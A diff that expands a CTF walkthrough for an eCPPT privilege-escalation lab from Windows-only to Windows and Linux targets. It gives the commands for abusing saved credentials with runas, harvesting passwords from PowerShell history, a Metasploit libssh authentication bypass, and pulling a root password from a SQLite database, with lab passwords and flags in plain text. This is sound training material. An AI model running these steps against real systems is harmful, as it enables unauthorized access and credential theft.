@@ -1,146 +1,185 @@
-# Privilege Escalation CTF 1 - Walkthrough
+Privilege Escalation CTF 1 - Full Walkthrough
+Overview
 
-## Overview
+This CTF is part of the eCPPT (eLearnSecurity Certified Professional Penetration Tester) Labs and is designed to simulate real-world privilege escalation scenarios on both Windows and Linux targets. The goal is to escalate privileges from a limited user account to administrator or root and capture four flags along the way.
+🎯 Objective
 
-This CTF is part of the eCPPT (eLearnSecurity Certified Professional Penetration Tester) Labs and is designed to simulate a real-world privilege escalation scenario on a Windows target. The goal is to escalate privileges from a standard user account to administrator and capture two flags along the way.
+    Start from limited user access on multiple systems.
 
----
+    Escalate privileges to administrator or root.
 
-## 🎯 Objective
+    Locate and exfiltrate four flags spread across the targets.
 
-* Start from limited user access.
-* Escalate to a higher-privileged account.
-* Locate and exfiltrate two flags.
+🧰 Tools & Environment
 
----
+    Windows 10 target machine.
 
-## 🧰 Tools & Environment
+    Linux target machine (Ubuntu 6.8 kernel).
 
-* Windows 10 target machine.
-* PowerShell / CMD.
-* Built-in Windows tools (no external binaries).
+    Metasploit Framework.
 
----
+    SQLite3.
 
-## 🏁 Flag 1 - User-Level Access (john)
+    Built-in Windows and Linux command-line tools.
 
-### Step 1: Enumerate Stored Credentials
+🏁 Flag 1 - User-Level Access (Windows)
+Step 1: Enumerate Stored Credentials
 
-From the default `student` user, enumerate stored credentials:
+Starting from the default student user on Windows, enumerated stored credentials:
 
-```powershell
 cmdkey /list
-```
 
-Output:
+Output revealed stored credentials for user john:
 
-```
 Target: Domain:interactive=EC2AMAZ-A251FFF\john
 Type: Domain Password
 User: EC2AMAZ-A251FFF\john
-```
 
-### Step 2: Impersonate john using Stored Credentials
+Step 2: Impersonate john Using Stored Credentials
 
-```powershell
+Executed runas to impersonate john:
+
 runas.exe /savecred /user:john cmd
-```
 
-Confirmed with:
+Verified the user context:
 
-```cmd
 whoami
-```
 
-```
+Output:
+
 ec2amaz-a251fff\john
-```
 
-### Step 3: Explore User's Home Directory
+Step 3: Explore User's Home Directory
 
-```cmd
+Navigated to john’s desktop directory:
+
 cd C:\Users\john\Desktop\john-data
-```
-
-```cmd
 dir
-```
 
-Found:
+Files found:
 
-* `data.txt`
-* `flag1.txt`
+    data.txt
 
-### Step 4: Read First Flag
+    flag1.txt
 
-```cmd
+Step 4: Read Flag 1
+
+Displayed contents of flag1.txt:
+
 type flag1.txt
-```
 
-**Flag 1:** `fa9598968df8452a80267dd377fc77bc`
+Flag 1: fa9598968df8452a80267dd377fc77bc
+🛗 Flag 2 - Privilege Escalation to Administrator (Windows)
+Step 5: Investigate PowerShell History
 
----
+Checked PowerShell history for potential credentials:
 
-## 🛗 Flag 2 - Privilege Escalation to Administrator
-
-### Step 5: Investigate PowerShell History
-
-Navigate to PowerShell history file:
-
-```cmd
 cd C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
-```
-
-```cmd
 type ConsoleHost_History.txt
-```
 
-Found hardcoded credentials:
+Discovered hardcoded credentials:
 
-```powershell
 $username = 'administrator'
 $passwd = "superStrong_123890"
-```
 
-### Step 6: Use Credentials to Escalate
+Step 6: Use Credentials to Escalate Privileges
 
-```cmd
+Used runas to elevate to administrator:
+
 runas /user:administrator cmd
-```
 
-Input password when prompted.
+Entered password superStrong_123890 when prompted.
 
-Confirm privilege escalation:
+Verified the context change:
 
-```cmd
 whoami
-```
 
-```
+Output:
+
 ec2amaz-a251fff\administrator
-```
 
-### Step 7: Retrieve Second Flag
+Step 7: Retrieve Flag 2
 
-```cmd
+Navigated to administrator’s directory and displayed flag:
+
 cd C:\Users\Administrator
-```
-
-```cmd
 type flag2.txt
-```
 
-**Flag 2:** `21b72b0bfa2144bba6b5c4ccd33ef1c2`
+Flag 2: 21b72b0bfa2144bba6b5c4ccd33ef1c2
+🐧 Flag 3 - User-Level Access (Linux target2.ine.local)
+Step 8: Exploit libssh Authentication Bypass
 
----
+Used Metasploit's auxiliary module to bypass SSH authentication without valid credentials:
 
-## ✅ Conclusion
+use auxiliary/scanner/ssh/libssh_auth_bypass
+set RHOSTS 192.148.160.3
+run
 
-This lab successfully demonstrated privilege escalation on a Windows system:
+This spawned a shell session on the Linux target.
+Step 9: Enumerate System and Home Directory
 
-* Exploited saved credentials to impersonate a local user.
-* Analyzed PowerShell history to discover hardcoded administrator credentials.
-* Used `runas` for privilege escalation.
-* Retrieved both flags.
+Interacted with the shell:
 
----
+whoami
+# Output: user
+
+id
+# Output: uid=1000(user) gid=1000(user) groups=1000(user)
+
+Checked user’s home directory for flags:
+
+ls /home/user
+# Output: flag3.txt (file present but could not read directly)
+
+🗄️ Flag 4 - Root Access via Extracting Database Credentials (Linux)
+Step 10: Search for Database Files
+
+Searched the entire file system for database files:
+
+find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null
+
+Located /home/webapp/database.db.
+Step 11: Query SQLite Database for Credentials
+
+Opened database and queried the users table:
+
+sqlite3 /home/webapp/database.db
+.tables
+# Output: users
+SELECT * FROM Users;
+# Output: 1|root|strongP@ssowrd123!!
+
+Extracted the root password: strongP@ssowrd123!!
+Step 12: Privilege Escalation to Root User
+
+Switched user to root with the password:
+
+su -
+# Enter password: strongP@ssowrd123!!
+
+Confirmed root privileges:
+
+id
+# Output: uid=0(root) gid=0(root) groups=0(root)
+
+Step 13: Retrieve Root Flag
+
+Listed contents of root directory and displayed flag:
+
+ls /root
+# Output: flag4.txt
+
+cat /root/flag4.txt
+# Output: a65b580d6d9a49d2bb5f3126eb88f505
+
+✅ Conclusion
+
+This lab effectively demonstrated privilege escalation on both Windows and Linux targets through multiple techniques:
+
+    On Windows, exploited stored credentials and PowerShell history to escalate from a limited user to administrator.
+
+    On Linux, exploited a libssh authentication bypass vulnerability to obtain an initial shell as a regular user.
+
+    Enumerated and extracted database files to retrieve root credentials stored in a SQLite database.
+
+    Used the extracted credentials to escalate to root and retrieve the final flag.
